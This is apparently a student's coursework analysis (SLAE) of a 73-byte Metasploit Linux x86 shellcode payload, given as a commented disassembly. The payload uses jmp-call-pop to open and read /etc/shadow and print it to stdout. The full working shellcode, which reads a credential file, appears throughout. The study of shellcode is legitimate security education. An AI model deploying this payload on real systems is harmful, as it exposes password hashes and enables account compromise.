 ; Student ID: SLAE – 871
 ; This is just small part of analysis. Please take a look on the blog to get full explanation
 ; code is free to use


No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes

00000000  EB36              jmp short 0x38    ; jmp-call to our file
00000002  B805000000        mov eax,0x5        ; systemcall 5 ==> open! (_NR_open)
00000007  5B                pop ebx            ; path to the file
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80

0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3        ; systemcall 3 ==> read!
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi        ; buf points to the stack
00000017  BA00100000        mov edx,0x1000    ; reads 4096 bytes ==> from MSF description  
; above:
; Description:
;   Read up to 4096 bytes from the local file system and write it back
;   out to the specified file descriptor
0000001C  CD80              int 0x80

0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4        ; systemcall 4 ==> write!
00000025  BB01000000        mov ebx,0x1        ; ebx = STDOUT
0000002A  CD80              int 0x80

0000002C  B801000000        mov eax,0x1        ; exit! syscall
00000031  BB00000000        mov ebx,0x0        ; zero status
00000036  CD80              int 0x80

00000038  E8C5FFFFFF        call dword 0x2    ; call back to the second instruction
0000003D  2F                das            ; I’d use here db ‘/etc/shadow’ 🙂
0000003E  657463            gs jz 0xa4        ;
00000041  2F                das            ;
00000042  7368              jnc 0xac        ;
00000044  61                popad
00000045  646F              fs outsd
00000047  7700              ja 0x49

 

jump-call-pop shellcode, main steps:
mov eax,0x5        ; systemcall 5 ==> open!
mov edx,0x1000    ; reads 4096 bytes from:
mov eax,0x3        ; systemcall 3 ==> read!
ov eax,0x4        ; systemcall 4 ==> write!
mov ebx,0x1        ; ebx = STDOUT
mov eax,0x1        ; exit! syscall


